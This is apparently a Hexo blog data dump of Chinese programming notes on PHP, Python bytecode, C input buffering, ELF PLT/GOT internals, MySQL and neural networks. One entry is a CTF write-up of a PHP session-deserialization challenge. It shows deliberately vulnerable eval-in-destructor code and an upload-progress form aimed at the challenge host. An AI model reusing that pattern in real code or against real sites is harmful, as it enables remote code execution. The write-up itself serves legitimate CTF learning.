    <content type="text"><![CDATA[php doc阅读笔记0 array 数组是php的key=&gt;value映射 key只能是integer和string类型，value可以是任意类型 所以key会有如下强制转换： 包含有合法整型值的字符串会被转换为整型。例如键名 &quot;8&quot; 实际会被储存为 8。但是 &quot;08&quot; 则不会强制转换，因为其不是一个合法的十进制数值。 浮点数也会被转换为整型，意味着其小数部分会被舍去。例如键名 8.7 实际会被储存为 8。 布尔值也会被转换成整型。即键名 true 实际会被储存为 1 而键名 false 会被储存为 0。 Null 会被转换为空字符串，即键名 null 实际会被储存为 &quot;&quot;。 数组和对象不能被用为键名。坚持这么做会导致警告：Illegal offset type。 比如官方举例如下： 123456789&lt;?php$array = array( 1 =&gt; "a", "1" =&gt; "b", 1.5 =&gt; "c", true =&gt; "d",);var_dump($array); 输出如下： 1234array(1) &#123; [1] =&gt; string(1) &quot;d&quot;&#125; 会导致数组的一部分值被覆盖掉 上例中所有的键名都被强制转换为 1，则每一个新单元都会覆盖前一个的值，最后剩下的只有一个 &quot;d&quot;。 同时： key 为可选项。如果未指定，PHP 将自动使用之前用过的最大 integer 键名加上 1 作为新的键名。 那就会有这种结果： 1234567$array = array( "a", "b",6 =&gt; "c", "d",);var_dump($array); 输出为： 12345678910array(4) &#123; [0] =&gt; string(1) &quot;a&quot; [1] =&gt; string(1) &quot;b&quot; [6] =&gt; string(1) &quot;c&quot; [7] =&gt; string(1) &quot;d&quot;&#125; 神奇的解引用语法 12345678910111213&lt;?phpfunction getArray()&#123; return array(1,2,3,4);&#125;//解引用语法$a = getArray()[0];var_dump($a);list(, $secondelement) = getArray();var_dump($secondelement); 输出为： 12int(1)int(2) list定义为：将数组中的值赋值给变量 用[]的语法 如果有一个数组 $arr = array(5 =&gt; 1, 12 =&gt; 2); 那么$arr[] = 56相当于$arr[13]=56 使用unset函数可以取消键值对映射比如unset($arr[5]),或者销毁一个数组unset($arr)]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python文档阅读笔记2]]></title>
    <url>%2F2019%2F07%2F30%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B02%2F</url>
    <content type="text"><![CDATA[fluent python reading notes 列表推导式 最常见的一种写法 123symboles = 'ABC%^&amp;*#@$'beyond_ascii = [ord(s) for s in symboles if ord(s) &gt; 40]print(beyond_ascii) 但是也可以同时用filter和map函数来实现 12beyond_ascii = list(filter(lambda x: x &gt; 40, map(ord, symboles)))print(beyond_ascii) map函数将一个函数作用于list中的每一个值上，filter也是对数组中的每一个值作用一个函数，但是只返回为真的数值，python3中最后返回的是一个filter对象 比如过滤列表中的所有奇数 1234# 过滤出列表中的所有奇数a = [1,242,45,23,536,1,325,63635,56335]a_is_odd = list(filter(lambda x: x % 2 != 0, a))print(a_is_odd) 再比如过滤出1~100中平方根是整数的数字 所谓整数就是能整除1的数字 1234#过滤出1~100中平方根是整数的数import mathg_is = list(filter(lambda x: math.sqrt(x) % 1 == 0, range(1, 101)))print(g_is) 解包 如下是一个比较神奇的栗子， 123456# python解包colors = ['black', 'white']sizes = ['S', 'M', 'L']for tshirt in ('%s %s' % (c, s) for c in colors for s in sizes): print(tshirt) 这里用一个%将元组进行了拆包 如何很好地理解列表推导式呢？ 你可以将其想象为一个函数，for c in colors for s in sizes 返回值是(c, s) 用一个%成功地对其进行了拆包转化为字符串形式 下面这幅图应该比较好理解 然后就有了返回值 当然还有这种写法： 1a, b, *rst = range(5) 陷阱 123t = (1,2, [30, 40])t[2] += [50, 60]print(t) 在一个不可变对象中插入了可变对象！ 虽然报错但是t的值确实被修改了 对其进行反汇编或者是反编译： 得到： 1234567891011121314151617183 0 LOAD_CONST 1 (1) 3 LOAD_CONST 2 (2) 6 LOAD_CONST 3 (30) 9 LOAD_CONST 4 (40) 12 BUILD_LIST 2 15 BUILD_TUPLE 3 18 STORE_FAST 0 (t) 4 21 LOAD_FAST 0 (t) 24 LOAD_CONST 2 (2) 27 DUP_TOP_TWO 28 BINARY_SUBSCR 29 LOAD_CONST 5 (50) 32 LOAD_CONST 6 (60) 35 BUILD_LIST 2 38 INPLACE_ADD 39 ROT_THREE 40 STORE_SUBSCR 作者提出的三个教训： 不要把可变对象放在元组里面 增量赋值不是一个原子操作 查看python的字节码并不难，而且了解代码背后的运行机制很有帮助 然后我们就来研究python的字节码 python字节码 变量 LOAD_FAST一般加载局部变量的值，也就是读取值，用于计算或者函数调用传参等。 STORE_FAST一般用于保存值到局部变量。 比如： 123461 77 LOAD_FAST 0 (n) 80 LOAD_FAST 3 (p) 83 INPLACE_DIVIDE 84 STORE_FAST 0 (n) INPLACE_DIVIDE就是原地除法，先加载n，然后加载p，然后除法，然后保存结果 对应的就是 n = n/p 如何区分函数形参和其他的局部变量？ 形参没有初始化，也就是从函数开始到LOAD_FAST该变量的位置，如果没有看到STORE_FAST，那么该变量就是函数形参。 123456789104 0 LOAD_CONST 1 (0) 3 STORE_FAST 1 (local1)5 6 LOAD_FAST 1 (local1) 9 PRINT_ITEM 10 LOAD_FAST 0 (arg1) 13 PRINT_ITEM 14 PRINT_NEWLINE 15 LOAD_CONST 0 (None) 18 RETURN_VALUE 这里arg1就没有STORE_FAST 所以对应的源代码为： 123def test(arg1): local1 = 0 print local1, arg1 全局变量 LOAD_GLOBAL用来加载全局变量，包括指定函数名，类名，模块名等全局符号。 12348 6 LOAD_CONST 2 (101) 9 STORE_GLOBAL 0 (global1) 20 LOAD_GLOBAL 0 (global1) 23 PRINT_ITEM 对应的python代码： 1234def test(): global global1 global1 = 101 print global1 常用数据类型 BUILD_LIST用于创建一个list结构。 如果是用列表推导式呢？ BUILD_MAP用于创建一个空的dict。STORE_MAP用于初始化dict的内容。 1234563 0 LOAD_CONST 1 ('a') 3 LOAD_CONST 2 ('1') 6 BUILD_MAP 1 9 STORE_FAST 0 (k) 12 LOAD_CONST 0 (None) 15 RETURN_VALUE 参考 死磕python字节码-手工还原python源码]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python字节码</tag>
        <tag>tricks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C语言缓冲区]]></title>
    <url>%2F2019%2F07%2F30%2FC%E8%AF%AD%E8%A8%80%E7%BC%93%E5%86%B2%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[调试一下c语言程序 自我感觉很久没写C语言了 getchar函数 1234567 char a = getchar();printf("a is %c\n", a);char b = getchar();printf("b is %c\n", b);char c = getchar();printf("c is %c\n", c);return 0; getchar函数是依次从缓冲区中取出字符来，会取走的！！ 1234nihaoa is nb is ic is h 这一行 12for (; scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == ' '; ++i) nums = (int*)realloc(nums, sizeof(int) * (i + 1)); //数组为非降序排列 这里会要求用户输入数据，用户输入的数据就是会存放在缓冲区内，然后之后scanf每次读一个数字，getchar紧随其后读一个字符，所以我们输入的时候必须是一个数字一个空格 1while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;); 之后把缓冲区的字符读干净 测试一下，如果我输入12 21\n 那么scanf读完21之后，getchar函数读\n 123456700D52466 je main+0DEh (0D524AEh) 00D52468 mov esi,esp 00D5246A call dword ptr [__imp__getchar (0D5F220h)] ;函数返回值存放在eax中，十进制10，代表LF00D52470 cmp esi,esp 00D52472 call __RTC_CheckEsp (0D51357h) 00D52477 cmp eax,20h 00D5247A jne main+0DEh (0D524AEh) 关键是这两条指令： 1200D52472 call __RTC_CheckEsp (0D51357h) 00D52477 cmp eax,20h 所以之后比较cmp eax 20h就会跳出循环 之后进入那个while循环 1234567while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);00D524AE mov esi,esp 00D524B0 call dword ptr [__imp__getchar (0D5F220h)] 00D524B6 cmp esi,esp 00D524B8 call __RTC_CheckEsp (0D51357h) 00D524BD cmp eax,0Ah 00D524C0 je main+119h (0D524E9h) 此时缓冲区已经是空的了，所以会要求用户继续输入数据 我此时输入了 1\n 所以调用完getchar函数之后eax存放了十六进制的49 那么第二个调用getchar读取的结果就是0Ah 1234500D524C2 mov esi,esp 00D524C4 call dword ptr [__imp__getchar (0D5F220h)] 00D524CA cmp esi,esp 00D524CC call __RTC_CheckEsp (0D51357h) 00D524D1 cmp eax,0FFFFFFFFh 继续。此时缓冲区已经空了 那么会要求用户继续输入 我又输入了一个换行符，很明显此时读取的结果非空，所以跳出while循环 12345600D524D8 call dword ptr [__imp__getchar (0D5F220h)] 00D524DE cmp esi,esp 00D524E0 call __RTC_CheckEsp (0D51357h) 00D524E5 test eax,eax ;检查eax是否为空00D524E7 jne main+11Bh (0D524EBh) 00D524E9 jmp main+0DEh (0D524AEh) 遇到的尴尬 如果要程序的健壮性，那么用户多输入一个空格就会出错，因为多输入一个空格程序就不知道后面那个是什么了，同时还涉及到getchar函数清空缓冲区，那个while循环的写法确实很经典，但是就没有考虑过如果缓冲区本身就是空的呢？ 我修改了一下原有的代码，加入了cin.peek函数来帮助判断 12345678910111213141516171819202122232425262728while (1)&#123; nums = (int*)realloc(nums, sizeof(int) * (i + 1)); scanf("%d", &amp;nums[i]); i++; char ch = getchar(); if (ch == ' ') &#123; if (isdigit(cin.peek())) &#123; continue; &#125; else &#123; break; &#125; &#125; if (ch == '\n') &#123; break; &#125;&#125;// for(;scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == '\n'; i++)// &#123;// nums = (int *)realloc(nums, sizeof(int)*(i+1));// &#125;fflush(stdin);]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>缓冲区</tag>
        <tag>getchar</tag>
        <tag>x86</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[blog 更新小记]]></title>
    <url>%2F2019%2F07%2F30%2Fblog-%E6%9B%B4%E6%96%B0%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[更新 简单地更新了一下自己的blog，虽然是这么说，但是实际上还是花了不少时间来完善，主要有： 修改了代码的高亮格式，黑色的主题更好看一些 更换了blog的markdown引擎，可以渲染emoj了 修改了自我介绍，去掉了网易云音乐的外链，因为失效了，同时添加了简书和知乎链接 添加了友链 添加了评论gitment TODO 搜索功能没有没法用 blog还可以更美化一点 一点感想 喜欢自己搭建的这个小天地，虽然有这么或者那么的不完善，但是这个blog见证着我的成长！]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊聊plt与got]]></title>
    <url>%2F2019%2F07%2F24%2F%E8%81%8A%E8%81%8Aplt%E4%B8%8Egot%2F</url>
    <content type="text"><![CDATA[深入理解plt和got 先写一段代码： 123456789// Build with: gcc -m32 --no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); exit(0);&#125; 途中遇到了一个报错： 1234In file included from /usr/include/stdio.h:27:0, from plt.c:3:/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such file or directory # include &lt;sys/cdefs.h&gt; 然后安装一个: apt install libc6-dev-i386 编译好程序之后 1234567$ checksec plt [*] &apos;/home/pxy/pwnable/plt&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序是没有pie的 readelf -S plt查看节表 12345[Nr] Name Type Addr Off Size ES Flg Lk Inf Al[12] .plt PROGBITS 08048300 000300 000050 04 AX 0 0 16[13] .text PROGBITS 08048350 000350 000192 00 AX 0 0 16[22] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4[23] .got.plt PROGBITS 0804a000 001000 00001c 04 WA 0 0 4 可以看到： .plt 基地址为： 0x08048300 .got 基地址为： 0x08049ffc .got.plt 基地址为： 0x0x804a000 我们从调用puts函数那里开始单步执行 首先跳转到plt表中 120x804845d &lt;main+16&gt; call puts@plt &lt;0x8048310&gt;0x8048310 &lt;puts@plt&gt; jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; call puts之后，下一条指令也是一个跳转 jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; 这条指令的意思是取出puts@got.plt表中的值，放到pc寄存器中 所以？查看一下此处内存的值： 12pwndbg&gt; x/2x 0x804a00c0x804a00c &lt;puts@got.plt&gt;: 0x08048316 0x08048326 所以下一条指令的地址就是0x08048316还是在plt表中 12► 0x8048316 &lt;puts@plt+6&gt; push 0 0x804831b &lt;puts@plt+11&gt; jmp 0x8048300 这里先将0放到栈上，表明是要解析puts函数的地址，然后再跳转到0x8048300也就是plt表的开始部分 12► 0x8048300 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048306 jmp dword ptr [0x804a008] &lt;0xf7ff0650&gt; 这时候先把.got.plt表中的第二项放到栈上 先查看一下.got.plt中前三项的内容: 12pwndbg&gt; x/3x 0x804a0000x804a000: 0x08049f14 0xf7ffd938 0xf7ff0650 将0xf7ffd938放置到栈上，然后跳转到.got.plt中的第三项，也就是 0xf7ff0650，这个地址就是_dl_runtime_resolve函数的地址 负责解析函数的地址 此时我们的got表内容如下： 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0x8048316 (puts@plt+6) ◂— push 0 /* &apos;h&apos; */[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push ebp puts函数的地址还没有重定位 当我们执行过一遍puts函数之后 这时候回过头来继续查看got表中的内容： 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push ebp[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ◂— push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ◂— push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ◂— push ebp 可以看到地址已经重定位好了 这和Windows的PE文件格式似乎有点不同了，PE文件是装载进内存之后函数地址都已经重定位好了，而Linux的elf文件刚刚装进内存之后函数的地址还是不确定的，需要在运行的时候进行重定位。 当我们将代码修改为如下时： 1234567891011pwndbg&gt; l 1, 20// Build with: gcc -m32 -no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); puts("hello world again !!!"); exit(0);&#125; 第一次调用puts函数之后： [0x804a00c] puts -&gt; 0xf7e727e0 (puts) ◂— push ebp puts函数地址已经重定位好了 接下来再次调用puts函数 123456► 0x8048310 &lt;puts@plt&gt; jmp dword ptr [0x804a00c] &lt;0xf7e727e0&gt; ↓ 0xf7e727e0 &lt;puts&gt; push ebp 0xf7e727e1 &lt;puts+1&gt; push edi 0xf7e727e2 &lt;puts+2&gt; push esi 0xf7e727e3 &lt;puts+3&gt; push ebx 此时可以看到直接就跳到函数的地址了 因为此时的.got.plt已经是puts函数的地址了， Linux tql 整理一下 之前看参考资料中博主的文章一直没有很理解，这里直接统一说一下我的理解： 何谓PLT与GOT 其实这里准确的来说应该叫got.plt而不是叫got，不过为了方便我们还是叫它got表吧 要注意那个jmp *printf@got *号是取出地址处的值，并不是跳到got表中去 延迟重定位 这篇文章我觉得写的很精彩 Linux为了缩减代码,就是按照这种模式来的： 12345678910void printf@plt()&#123;address_good: jmp *printf@got // 链接器将printf@got填成下一语句lookup_printf的地址lookup_printf: 调用重定位函数查找printf地址，并写到printf@got goto address_good;&#125; 也就和上面那张图是一一对应的 公共got表项 在解析函数的真正地址时， _dl_runtime_resolve是怎么知道它要解析哪个函数的 因为： 1234printf@plt&gt;: jmp *0x80496f8 push $0x00 jmp common@plt 这里push的值不一样，相当于就是每个函数取了一个id 之后就是公共got表的内容： got[0]: 本ELF动态段(.dynamic段）的装载地址 got[1]：本ELF的link_map数据结构描述符地址 got[2]：_dl_runtime_resolve函数的地址 穿针引线 PLT表中的第一项为公共表项，剩下的是每个动态库函数为一项（当然每项是由多条指令组成的，jmp *0xXXXXXXXX这条指令是所有plt的开始指令）每项PLT都从对应的GOT表项中读取目标函数地址 GOT表中前3个为特殊项，分别用于保存 .dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址；但在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充 参考 聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT 聊聊Linux动态链接中的PLT和GOT（２）——延迟重定位 聊聊Linux动态链接中的PLT和GOT（３）——公共GOT表项 聊聊Linux动态链接中的PLT和GOT（4）—— 穿针引线 GOT and PLT for pwning.]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python文档阅读笔记1]]></title>
    <url>%2F2019%2F07%2F24%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[python 官方文档阅读 python可视化编程网站 循环 循环的问题 list类型是可变序列 12345words = ['cat', 'window', 'defenestrate']for w in words[:]: if len(w) &gt; 6: words.insert(0, w)print(words) 如果将上述代码的循环语句改为： for w in words: 那么这个循环就变成了死循环 原因是words这个list会被修改 同样的可以看这个： 12345basket = ['apple', 'orange', 'pear', 'orange', 'banana']for f in sorted(basket): print(f)print(basket) 在经过sorted函数之后，basket已经被修改了 可以看这个： &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=basket%20%3D%20%5B'apple',%20'orange',%20'pear',%20'orange',%20'banana'%5D%0Afor%20f%20in%20sorted%28basket%29%3A%0A%20%20%20%20print%28f%29%0A&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=5&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; 同样的list还有这样一个问题： 代码如下： 1234567def f(a, L=[]): L.append(a) return Lprint(f(1))print(f(2))print(f(3)) &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=def%20f%28a,%20L%3D%5B%5D%29%3A%0A%20%20%20%20L.append%28a%29%0A%20%20%20%20return%20L%0A%0Aprint%28f%281%29%29%0Aprint%28f%282%29%29%0Aprint%28f%283%29%29&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=15&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; 修改成这样就行： 12345def f(a, L = None): if L is None: L = [] L.append(a) return L 循环的tricks dict循环 123knights = &#123;'gallahad':'the pure', 'robin':'the brave'&#125;for key, value in knights.items(): print(key, value) list循环 12for index, value in enumerate(['tac', 'tic', 'toe']): print("index = &#123;&#125;, value = &#123;&#125;".format(index, value)) 两个list循环 12345questions = ['name', 'quest', 'favorite color']answers = ['lancelot', 'the holy grail', 'blue']for q,a in zip(questions, answers): print("what is your &#123;&#125;? It is &#123;&#125;".format(q, a)) 逆向循环 123# 逆向循环序列时，先正向，再调用reverse()函数for i in reversed(range(1, 10, 2)): print(i) 指定顺序循环，用sorted函数 参数的传递 之前还一直没明白python中**param这种传递形式的用法 这个栗子就很棒啦 123456789101112def cheeseshop(kind, *arguments, **keywords): print("-- Do you have any", kind, "?") print("-- I'm sorry, we're all out of", kind) for arg in arguments: print(arg) print("-" * 40) for kw in keywords: print(kw, ":", keywords[kw])cheeseshop("Limburger", "It's very runny, sir.", "It's really very, VERY runny, sir.",shopkeeper="Michael Palin", client="John Cleese", sketch="Cheese Shop Sketch") 结果如下： 12345678-- Do you have any Limburger ?-- I&apos;m sorry, we&apos;re all out of LimburgerIt&apos;s very runny, sir.It&apos;s really very, VERY runny, sir.----------------------------------------shopkeeper : Michael Palinsketch : Cheese Shop Sketchclient : John Cleese 第一个kind参数就是第一个字符串，之后arguments相当于一个接收了一个list，keywords接收了一个dict 解包参数列表 比如这个栗子： 12args = [3,6]list(range(*args)) 输出的结果就是 [3,4,5] 也就是说我们可以通过*运算符来对一个list进行解包并将其作为参数传递 匿名函数lambda 12pairs = [(1, 'one'), (2, 'two'), (3, 'three'), (4, 'four')]pairs.sort(key=lambda pair:pair[1]) sort方法有两个参数，一个是指定待排序的关键字，一个是reversed，其中key用一个匿名函数进行指定，有一点函数式编程的味道]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[探寻数据库]]></title>
    <url>%2F2019%2F07%2F22%2F%E6%8E%A2%E5%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[mysql命令行操作小结 感觉这些知识又快忘记了 登陆 mysql -u root -p 创建数据库 create database databasename 删除数据库 drop database databasename 从外部sql文件导入，如果sql文件中没有创建数据库需要先指定一个数据库然后source path/*.sql就可以导入了，再也不用受烦人的phpmyadmin影响了 删除数据表drop table table_name 导出表mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txt 导出数据库mysqldump -u root -p RUNOOB &gt; database_dump.txt 备份所有数据库mysqldump -u root -p --all-databases &gt; database_dump.txt 一般sql文件的写法： 123456789drop database if exists DBName;creat database DBName;use DBName;#开始创建表create ......#开始插入数据insert.... 使用pymysql连接数据库 1234567891011import pymsqlcon = pymysql.connect('localhost', 'root', '', 'mpsa')try: with con.cursor() as cursor: sql = 'drop database runoob' cursor.execute(sql) con.commit()finally: con.close() 那个cursor函数我也不是很明白为什么，不过一般的用法就是这样啦 php连接数据库 使用php连接数据库,创建数据库，然后删除 123456789101112131415$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(!$conn)&#123; die("error!!");&#125;echo "连接成功";//查询数据$sql = "create database runoob";$retval = mysqli_query($conn, $sql);if(!$retval)&#123; die("查询数据失败！");&#125;echo "创建成功";$sql1 = "drop database runoob";$retval = mysqli_query($conn, $sql);mysqli_close($conn); 遇到了问题： 查了一下stackoverflow 看到了这个回答： The mysqli-&gt;connect_error property only works properly as of PHP versions 5.2.9 and 5.3.0. Use the mysqli_connect_error() function if compatibility with earlier PHP versions is required. 12345678910111213141516171819$mysqli = new mysqli('localhost', 'my_user', 'my_password', 'my_db');/* * This is the "official" OO way to do it, * BUT $connect_error was broken until PHP 5.2.9 and 5.3.0. */if ($mysqli-&gt;connect_error) &#123; die('Connect Error (' . $mysqli-&gt;connect_errno . ') ' . $mysqli-&gt;connect_error);&#125;/* * Use this instead of $connect_error if you need to ensure * compatibility with PHP versions prior to 5.2.9 and 5.3.0. */if (mysqli_connect_error()) &#123; die('Connect Error (' . mysqli_connect_errno() . ') ' . mysqli_connect_error());&#125; 原来是建立过程中的不稳定，怪不得我新建的数据库没有被删掉. 参考 stackoverflow的回答 pymysql文档，写的很简单]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-challenge9]]></title>
    <url>%2F2019%2F07%2F22%2Fphp-challenge9%2F</url>
    <content type="text"><![CDATA[php-challenge 9 第一次接触到这个题目，被惊呆了 12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; 初看源代码觉得并没有哪里可以让我反序列化注入的地方 但是问题就出在第一句话： ini_set('session.serialize_handler', 'php'); 关键点在于，如果脚本中设置的序列化处理器与php.ini设置的不同，或者两个脚本注册session使用的序列化处理器不同，那么就会出现安全问题。 只需要加一个|就行 这道jarvisOj题目就是这个原题 这里还用到了另外一个漏洞： 自己构造一个网页如下： 12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; 然后在上传一个文件，本地抓包，这里遇到了一点小问题，就是没办法抓到本地的包，可以通过直接对局域网的网络连接进行设置即可. 此时就可以看到了 接下来继续利用 tql。。。 有趣的php反序列化总结 szfszf jarvisoj-web-writeup]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[deep learning1]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning1%2F</url>
    <content type="text"><![CDATA[感知机补充 接着写 感知机的训练中，老师还提供了一部份资料，比如训练出$y=2x$ 我们简要地看一下一次训练的结果： bias x y w0 w1 yout y-yout adj0 adj1 alpha w0new w1new 1 0.512 1.023 0.719 0.403 0.926 0.977 0.977 0.500 0.7 0.788 0.438 进行很多次训练之后画出的图形： 预测的还是挺准确的 为什么需要bias？ 概念上很好理解，bias就是将一个正比例函数变为了一次函数，这样不必每次都过原点，分类的准确性也就大大地提高了 多层感知机 一层的感知机是没办法处理异或问题的 所以需要增加隐藏层 就像下面这样： 这样就可以做到了： 感觉MLP的数学知识太过复杂了，暂时放着 keras 从栗子代码开始： 12345678910111213141516171819202122from keras.models import Sequentialmodel = Sequential()from keras.layers import Dense'''使用add来堆叠模型'''model.add(Dense(units=64, activation='relu', input_dim=100))model.add(Dense(units=10, activation='softmax'))'''使用compile来配置学习过程'''model.compile(loss='categorical_crossentropy', optimizer='sgd', metrics=['accuracy'])# x_train 和 y_train 是 Numpy 数组 -- 就像在 Scikit-Learn API 中一样。model.fit(x_train, y_train, epochs=5, batch_size=32)'''评估模型'''loss_and_metrics = model.evaluate(x_test, y_test, batch_size=128)classes = model.predict(x_test, batch_size=128) Sequential compile 在训练模型之前，需要配置学习过程，compile接收三个参数 优化器optimizer 损失函数loss 评估标准metrics 一个个来看 优化器 可以先实例化一个优化器对象，然后将它传入model.compile()，或者可以通过 损失函数 损失函数（或称目标函数、优化评分函数）是编译模型时所需的两个参数之一： 1model.compile(loss='mean_squared_error', optimizer='sgd') 我们可以传递一个现有的损失函数名，或者一个tensorflow符号函数，有以下两个参数 y_true: 真实标签. y_pred: 预测值,其shape与y_true相同 可用的损失函数： mean_squared_error mean_absolute_error 等 参考 神经网络中w,b参数的作用（为何需要偏置b的解释） 深度学习中偏移项bias的作用]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
      <tags>
        <tag>deep-learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[deep learning0]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning0%2F</url>
    <content type="text"><![CDATA[deep learning 整理一下上课的笔记，不然全都会忘了去 无监督学习 self organizing map 简称SOM算法 大意：给定一个向量$v_{k}$,寻找到距离最近的神经元 找到最接近的神经元 $$n_{bmu}=\underset{1\leqslant i\leqslant m}{argmin}\left | v_{k}-n_{i} \right |$$ 更新$n_{i}$ wikipedia上一张很形象的图片: 蓝色斑点是训练数据的分布，小白色光盘是从该分布中抽取的当前训练数据。首先（左），SOM节点任意地位于数据空间中。选择最接近训练基准的节点（以黄色突出显示）。它被移向训练数据，因为（在较小程度上）是它在网格上的邻居。在多次迭代之后，网格倾向于近似数据分布（右）。 有监督学习 数学知识 特征向量 线性代数中的特征向量： 对于一个给定的方阵A，它的特征向量v经过线性变化之后，得到的新向量仍然与原来的v保持在同一条直线上，但其长度或方向也许会改变，即： $$Av=\lambda v$$ 此时$v$就是矩阵$A$的特征向量，$\lambda$就是对应的特征值 进一步：在一定条件下，一个变换可以由其特征值特征向量完全表述，也就是说，所有的特征向量组成了这向量空间的一组基底。 一个特征空间是具有相同特征值的特征向量与一个同维数的零向量的集合，比如$E_{\lambda }=\left { u\in V | Au=\lambda u\right }$即为线性变化$A$中以$\lambda$为特征值的特征空间 抽象概念不容易理解，举几个栗子： 恒等变换$I$的特征向量 $$I(v)=v=1\cdot v$$ 可以看到所有的特征向量都是恒等变换$I$的特征向量，恒等变换的特征空间只有一个就是整个空间 类似的，数乘变换$\lambda I$的特征向量也是所有的非零向量，因为按照定义： $$\lambda I(v) = \lambda \cdot v$$ 感知器 看张图： 数学表述为：$t = f(\sum {i=1}^{n} w{i}x_{i} + b) = f(\mathbf{w}^{T} \mathbf{x})$ f函数的表达式： $$f(x) = \left{\begin{matrix} 1 &amp; if , w \cdot x + b &gt; 0 \ 0 &amp; else \end{matrix}\right.$$ $\mathbf{x} = \left [ x_{1}, x_{2} ... , x_{n} , \ 1 \right]^{T}$, $\mathbf{w} = \left [ w_{1}, w_{2} , ...w_{n} , \ b \right]^{T}$ 如何训练？ 我们来看一个训练与运算的demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445import numpy as npdef load_data(): ''' 加载数据，input_data和labels对应 ''' input_data = [[1, 1], [0, 0], [1, 0], [0, 1]] labels = [1, 0, 0, 0] return input_data, labelsdef train_pre(input_data, y, iteration, rate): ''' 训练，更新w和b ''' unit_step = lambda x: 0 if x &lt; 0 else 1 w = 